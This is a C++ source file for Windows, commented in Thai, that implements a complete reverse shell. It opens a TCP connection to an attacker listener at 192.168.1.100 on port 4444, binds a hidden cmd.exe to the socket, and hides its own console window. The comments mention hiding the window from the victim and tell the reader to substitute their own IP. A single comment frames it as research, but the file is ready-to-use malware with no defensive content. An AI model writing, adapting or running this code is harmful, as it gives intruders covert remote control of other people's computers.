#include <iostream>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

// ฟังก์ชันหลักสำหรับรัน Shell
void SpawnReverseShell(const char* remote_ip, int remote_port) {
    WSADATA wsaData;
    SOCKET winsocket;
    struct sockaddr_in server_addr;
    STARTUPINFOA si;
    PROCESS_INFORMATION pi;

    // 1. Initialize Windows Socket
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        return; 
    }

    // 2. Create Socket (TCP)
    winsocket = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (winsocket == INVALID_SOCKET) {
        WSACleanup();
        return;
    }

    // 3. Setup Server Address
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(remote_port);
    inet_pton(AF_INET, remote_ip, &server_addr.sin_addr);

    // 4. Connect to Attacker/Listener
    if (WSAConnect(winsocket, (SOCKADDR*)&server_addr, sizeof(server_addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
        closesocket(winsocket);
        WSACleanup();
        return;
    }

    // 5. I/O Redirection (หัวใจสำคัญของวิจัย)
    // เราจะ Map Standard Input/Output/Error ของ CMD ไปที่ Socket โดยตรง
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)winsocket;
    si.wShowWindow = SW_HIDE; // ซ่อนหน้าต่าง CMD ไม่ให้เหยื่อเห็น

    // 6. Execute CMD Process
    char cmd[] = "cmd.exe";
    if (!CreateProcessA(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
        closesocket(winsocket);
        WSACleanup();
        return;
    }

    // รอจนกว่ากระบวนการจะสิ้นสุด (Session ปิด)
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup Resources
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    closesocket(winsocket);
    WSACleanup();
}

int main() {
    // กำหนด IP และ Port ของเครื่องผู้รับ (Listener)
    const char* attacker_ip = "192.168.1.100"; // เปลี่ยนเป็น IP ของคุณ
    int port = 4444;

    // รันใน Background โดยไม่มีหน้าต่าง Console
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    SpawnReverseShell(attacker_ip, port);

    return 0;
}
